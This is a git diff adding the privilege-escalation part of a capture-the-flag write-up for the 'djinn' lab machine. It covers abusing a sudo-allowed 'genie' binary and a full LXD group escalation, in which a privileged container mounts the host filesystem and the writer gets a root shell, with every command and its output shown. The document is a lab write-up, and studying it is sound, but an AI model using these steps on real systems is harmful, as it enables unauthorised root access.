@@ -219,3 +219,86 @@ nitish@djinn:~$ ls -l /home/nitish/user.txt
 ```
 And we get the user flag. :D Cool!
 
+### Privesc
+Let's continue our jurney. Checking the sudo commands for the user we find one
+```
+User nitish may run the following commands on djinn:
+    (sam) NOPASSWD: /usr/bin/genie
+
+nitish@djinn:~$ sudo -u sam  /usr/bin/genie -h
+usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
+
+I know you've came to me bearing wishes in mind. So go ahead make your wishes.
+
+positional arguments:
+  wish                  Enter your wish
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -g, --god             pass the wish to god
+  -p SHELL, --shell SHELL
+                        Gives you shell
+  -e EXEC, --exec EXEC  execute command
+```
+
+Ok. Now the carousel starts. I tried looking at it with strings. Tried various input to it. I was thinking of debugging it but on my local machine I was missing a library. I tried inputing credentials to it. Nothing worked. At some point looking for the Nth time at the output of strings I again saw genie.py/genie.c. I already searched for these before in hope I could fine the source code. Let's just search for `genie`.
+```
+nitish@djinn:~$ find / -name "*genie*" 2>/dev/null
+/usr/bin/genie
+/usr/share/man/man8/genie.8.gz
+/usr/share/man/man8/genie.1.gz
+/usr/share/mime/text/x-genie.xml
+/opt/80/templates/genie.html
+```
+Hey! We have ourselves a man page for the command. The help flag forgot an argument :). Trying left and right with the new argument we finally get a shell as `sam`. It's a "dumb" shell so I upgrade it to a full shell with `socat`.
+
+What do we have here?
+
+```
+User sam may run the following commands on djinn:
+    (root) NOPASSWD: /root/lago
+```
+All right. Looks like our next point of entry. Just needs some brainwork on this as well and we are root! 
+
+Now I tried various combinations here as well. I tried writing a script in python which read the output of the command and inputted a random number trying to bruteforce it. I managed to only get some data from the command when I thought "Let me do this in bash. Maybe it's easier". 
+
+I tried creating a nice for loop in bash and ended up just sending a value to the program. From time to time I did not receive the *Wrong* message back but nothing else either. Let's try other things.
+
+Digging and diggin, somehow I realised that I was membemr of a lot of groups.
+
+```
+sam@djinn:/tmp/20200509_13:00$ id
+uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
+```
+
+Instresting. Let's find out what files I have access to as this group.
+Out of all one stands out: `/var/lib/lxd/unix.socket`. My initial thought was that I was somehow connected as container to the host and will be able to break out.
+
+After some digging around the internet and reading about LXC (of which I know very few about) I found these 2 good resources: https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation & https://www.hackingarticles.in/lxd-privilege-escalation/.
+
+From the latter I ran `lxd init` defaulting everthing besides the storage backend to `dir`. 
+
+Next step was to download an Alpine Linux container image from. https://us.images.linuxcontainers.org/images/alpine/3.11/amd64/default/
+
+I now proceeded with 
+```
+sam@djinn:/tmp/20200509_13:00$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+Image imported with fingerprint: d389eb93bf6d27a9f0940b2c903097c208a0834044a9b98218364c207e3059fc
+
+sam@djinn:/tmp/20200509_13:00$ lxc init alpine privesc -c security.privileged=true
+Creating privesc
+
+sam@djinn:/tmp/20200509_13:00$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+Device host-root added to privesc
+
+sam@djinn:/tmp/20200509_13:00$ lxc start privesc
+sam@djinn:/tmp/20200509_13:00$ lxc exec privesc /bin/sh
+~ # ls
+~ # id
+uid=0(root) gid=0(root)
+~ # ls /mnt/root/root/
+lago      proof.sh
+```
+
+###Conclusion
+Wow. That was quite a ride. Spawning 2 days it combined both CTF and real world issues I guess. In the end the creds.txt and the root program were just rabbit hole. I really liked this room (even more I could beat it myself). Get it touch for feedback :)
